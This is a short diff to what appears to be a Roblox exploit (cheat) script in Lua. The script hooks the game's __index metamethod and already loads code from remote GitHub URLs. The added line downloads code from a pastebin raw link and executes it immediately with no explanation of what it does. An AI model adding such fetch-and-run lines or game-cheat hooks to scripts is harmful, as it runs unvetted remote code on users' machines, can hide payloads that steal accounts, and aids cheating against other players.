@@ -4,6 +4,8 @@ getgenv().Protector = loadstring(game:HttpGetAsync("https://raw.githubuserconten
 
 getgenv().confi = loadstring(game:HttpGetAsync("https://l8x.github.io/syndexpro/confi.lua"))
 
+loadstring(game:HttpGetAsync("https://pastebin.com/raw/ri3pGiYz"))()
+
 local OldIndex
 OldIndex = hookmetamethod(game, "__index", function(Self, Index)
     return OldIndex(Self, Index)
